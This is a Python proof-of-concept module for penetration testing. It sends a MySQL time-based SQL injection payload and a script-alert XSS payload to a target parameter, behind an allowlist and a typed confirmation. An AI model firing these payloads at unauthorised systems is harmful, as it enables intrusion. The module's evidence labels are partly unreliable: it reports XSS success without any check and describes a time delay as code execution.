import requests
import logging
import time
from urllib.parse import urlparse

log = logging.getLogger(__name__)

class PoCModule:
    """
    Executes safe, non-destructive PoCs for *confirmed* findings.
    Requires an allowlist and user confirmation to run.
    """
    def __init__(self, session, allowlist=None):
        self.session = session
        self.session.headers["User-Agent"] = "Penetration-Tester-PoC/1.0"
        self.allowlist = allowlist or []
        if not self.allowlist:
            log.error("PoCModule initialized with an EMPTY allowlist. No PoCs will run.")

    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def _send_request(self, method, url, params_or_data, timeout=15):
        try:
            if method.upper() == "GET":
                return self.session.get(url, params=params_or_data, timeout=timeout, allow_redirects=True)
            elif method.upper() == "POST":
                return self.session.post(url, data=params_or_data, timeout=timeout, allow_redirects=True)
        except requests.exceptions.RequestException as e:
            if "timed out" in str(e).lower() or "timeout" in str(e).lower():
                log.info("Request timed out (This is *expected* for a successful time-based SQLi PoC).")
                return None 
            else:
                log.warning(f"Request failed for {url} ({e})")
        return None

    def _poc_sql_timebased(self, finding):
        log.info("--- Attempting SQLi (Time-Based) PoC ---")
        url, method = finding['url'], finding['method']
        param_to_test = finding['param']
        poc_params = finding['base_params'].copy()

        # MySQL-friendly time-based payload
        base_value = str(poc_params.get(param_to_test, ""))
        payload = base_value + " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)"
        poc_params[param_to_test] = payload
        
        log.info(f"Sending time-based payload to {url} on param '{param_to_test}'...")
        start_time = time.time()
        self._send_request(method, url, poc_params, timeout=10)  # 10s timeout for a 5s sleep
        duration = time.time() - start_time
        
        if duration >= 5.0:
            result = {
                "success": True,
                "type": "SQLi (Time-Based) PoC",
                "evidence": f"Server response delayed by {duration:.2f} seconds, confirming code execution."
            }
            log.info(f"PoC SUCCESSFUL. {result['evidence']}")
            return result
        else:
            result = {
                "success": False,
                "type": "SQLi (Time-Based) PoC",
                "evidence": f"Server responded in {duration:.2f} seconds. PoC failed."
            }
            log.info(f"PoC FAILED. {result['evidence']}")
            return result

    def _poc_xss_alert(self, finding):
        log.info("--- Attempting XSS (Alert) PoC ---")
        url, method = finding['url'], finding['method']
        param_to_test = finding['param']
        poc_params = finding['base_params'].copy()

        payload = "<script>alert('XSS-PoC-Success')</script>"
        poc_params[param_to_test] = payload
        
        log.info(f"Sending XSS alert payload to {url} on param '{param_to_test}'...")
        self._send_request(method, url, poc_params, timeout=10)
        
        result = {
            "success": True,
            "type": "XSS (Alert) PoC",
            "evidence": "PoC payload sent successfully.",
            "follow_up": "Check your lab target's browser to confirm the alert box executed."
        }
        log.info(f"PoC payload sent. {result['follow_up']}")
        return result

    def run_poc(self, finding):
        """
        Main controller for running a PoC.
        This performs the Allowlist and Confirmation checks.
        """
        target_url = finding['url']
        base_url = self._get_base_url(target_url)

        if base_url not in self.allowlist:
            log.error(f"PoC ABORTED: Target {base_url} is not in the allowlist.")
            return {"error": "Target not in allowlist."}

        # Confirmation Flow
        print("\n" + "=" * 50)
        print("          *** PoC WARNING ***")
        print(f"You are about to run a live PoC for: {finding['type']}")
        print(f"Target URL: {target_url}")
        print(f"Parameter:  {finding['param']}")
        print("This module will send a test payload.")
        print("This should ONLY be run against an isolated, controlled lab target.")
        print("=" * 50)
        
        confirm = input("Are you sure you want to proceed? (Type 'yes' to confirm): ")
        
        if confirm.lower() != 'yes':
            log.info("PoC ABORTED by user.")
            return {"error": "User aborted."}

        if "SQLi" in finding['type']:
            return self._poc_sql_timebased(finding)
        elif "XSS" in finding['type']:
            return self._poc_xss_alert(finding)
        else:
            log.warning(f"No PoC routine available for finding type: {finding['type']}")
            return {"error": f"No PoC available for {finding['type']}"}
